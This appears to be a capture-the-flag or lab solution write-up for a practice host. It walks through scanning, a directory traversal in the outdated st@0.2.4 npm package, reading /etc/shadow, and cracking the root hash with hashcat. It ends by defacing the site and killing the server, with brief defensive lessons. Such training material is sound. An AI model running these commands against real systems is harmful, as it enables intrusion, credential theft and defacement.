# Unsafe Solution

*19 December 2017*

Assumes the domain name is `static.twlinux.io`.

## Reconnaissance

### nmap port scanning

```bash
nmap -O -F -sS static.twlinux.io
```

- DNS port 53 (dnsmasq)
- SSH port 22 (sshd)
- TELNET port 23 (telnetd)
- FTP port 21 (vsftpd)

https://github.com/jennydaman/twlinux/wiki/nmap#port-scan

### Packet sniffing

Use an ARP spoof attack coupled with dsniff to intercept the normal telnet user password.

In the normal user's directory, there are two files: `~/hint` and `~/.hint2`. `~/.hint2` is a hidden file, which is revealed by the command `ls -a`. Retrieve these files via any open network service.

### White-box testing

Inspect `package.json`.

```json
"dependencies": {
  "colors": "^1.1.2",
  "github-markdown-css": "^2.9.0",
  "ip": "^1.1.5",
  "st": "0.2.4"
}
```

Notice that `st@0.2.4` is missing the `^` carrot symbol, which indicates that the outdated version 0.2.4 was explicitly stated as a dependency.

### nikto

*Credits to Basaam Malik for discovering this solution.*

This is a [black-box](https://en.wikipedia.org/wiki/Black-box_testing) solution.

[nikto](https://github.com/sullo/nikto/blob/master/README.md) is a web server scanner.

```bash
nikto -h static.twlinux.io
```

### Conclusion

**`st@0.2.4` is vulnerable to [directory traversal](https://www.owasp.org/index.php/Path_Traversal).**

https://www.npmjs.com/package/st

### System analysis

The file `/etc/login.defs` describes configurations relevant to user authentication and login.

```bash
# less is used to preview files
curl http://static.twlinux.io/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/login.defs | less
```

This is the result:

```
#
# /etc/login.defs - Configuration control definitions for the login package.
#
<output omitted>
#
# Hash shadow passwords with SHA512.
#
ENCRYPT_METHOD  SHA512
```

Alternatively, you could simply use `grep` to filter the output:

```bash
curl http://static.twlinux.io/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/login.defs | grep -f ENCRYPT_METHOD
```

Modern Linux systems use the SHA-512 + salt algorithm for password storage.

## Exploit

```bash

# retrieve the root password hash
curl http://static.twlinux.io/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow | grep -f root > root_passwd.hash

# execute a dictionary attack
hashcat -m 1800 -a 0 -w 3 --status --status-timer=1 -o clear_password.out root_passwd.hash /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

Use the retrieved password to open a remote session through `ssh` (or `telnet`).

## Attack Objective

```bash
# leave a friendly message using a "here document"
cat > /var/www/html/blog/index.html << EOF
<html>
<body>
<h1>Don't forget to update your node.js modules!</h1>
"My gran could do better! And she's dead!" ~Gordon Ramsay
</body>
</html>
EOF

# kill the server
killall node
```

## Report

### Lessons Learned

- Close unnecessary ports.
- Keep your software up to date.

As a black hat hacker, you could upload malware to the site. Or you could modify the server logic.
